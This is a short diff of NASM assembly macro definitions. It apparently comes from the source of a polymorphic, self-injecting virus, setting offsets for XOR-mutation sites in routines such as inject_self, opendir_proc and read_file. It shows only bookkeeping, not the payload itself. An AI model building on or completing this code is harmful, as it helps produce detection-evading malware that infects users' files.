@@ -90,7 +90,7 @@
 %define POLY_XOR_R11_3_OFFSET inject_self.poly_xor_r11_3 - _start
 %define POLY_XOR_R11_4_OFFSET inject_self.poly_xor2 - _start
 %define POLY_XOR_R11_5_OFFSET inject_self.poly_xor_r11_5 - _start
-%define POLY_XOR_R10_6_OFFSET incject_self.poly_xor3 - _start
+%define POLY_XOR_R11_6_OFFSET inject_self.poly_xor3 - _start
 
 %define POLY_XOR_R11_SIZE 8
 %define POLY_XOR_R11_NUMBER 0x00000005
@@ -100,6 +100,11 @@
 %define POLY_XOR_RDI_1_OFFSET process.poly_xor_rdi_1 - _start
 %define POLY_XOR_RDI_2_OFFSET _start.check_status - _start
 %define POLY_XOR_RDI_3_OFFSET inject_self.poly_xor_rdi_3 - _start
+%define POLY_XOR_RDI_4_OFFSET inject_self.get_rand_key - _start
+%define POLY_XOR_RDI_5_OFFSET _start.opendir_proc - _start
+%define POLY_XOR_RDI_6_OFFSET _start.poly_xor_rdi_6 - _start
+%define POLY_XOR_RDI_7_OFFSET inject_self.jmp_wuw - _start
+%define POLY_XOR_RDI_8_OFFSET _start.read_file - _start
 
 %define POLY_XOR_RDI_SIZE 8
 %define POLY_XOR_RDI_NUMBER 0x00000005
